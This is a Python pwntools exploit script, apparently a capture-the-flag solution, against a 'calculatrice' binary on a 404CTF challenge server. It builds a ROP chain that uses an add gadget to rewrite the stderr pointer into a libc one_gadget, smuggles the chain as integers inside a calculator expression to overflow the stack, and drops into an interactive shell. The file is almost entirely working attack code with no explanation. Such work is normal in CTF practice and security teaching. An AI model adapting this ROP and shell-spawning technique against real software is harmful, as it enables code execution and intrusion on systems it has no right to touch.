#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('calculatrice')
libc = ELF('libc.so.6')

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 32111)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *0x004016a1
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

OFFSET = 0xd
exe.sym['main'] = 0x4016df

ADD_GADGET = 0x000000000040125c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
JMP_RSI = 0x0000000000401638 # jmp qword ptr [rsi - 0x39]
ONE_GADGET = 0x10a2fc + 0x1c0
ONE_GADGET = 0x4f302+ 0x1c0

rop = ROP(exe)
rop.rbp = exe.sym['stderr'] + 0x3d
rop.rbx = (ONE_GADGET - libc.sym['stderr'])
rop.raw(ADD_GADGET)
rop.rsi = exe.sym['stderr'] + 0x39
rop.raw(JMP_RSI)

print(rop.dump())

p  = '*'*OFFSET

ropchain = rop.chain()
for i in range(0, len(ropchain), 8):
    p += f"{u64(ropchain[i:i+8], sign=True)}*" 


print(p, hex(len(p)))

assert len(p) <= 0x93, f"Payload too long {len(p):x}"

io.sendlineafter(b'calcul : ', p.encode())

#leak = u64(io.recvline().strip().ljust(8,b'\0'))
#libc.address = leak - libc.sym['puts']

#log.success(f"{leak = :x} {libc.address = :x}")

io.interactive()

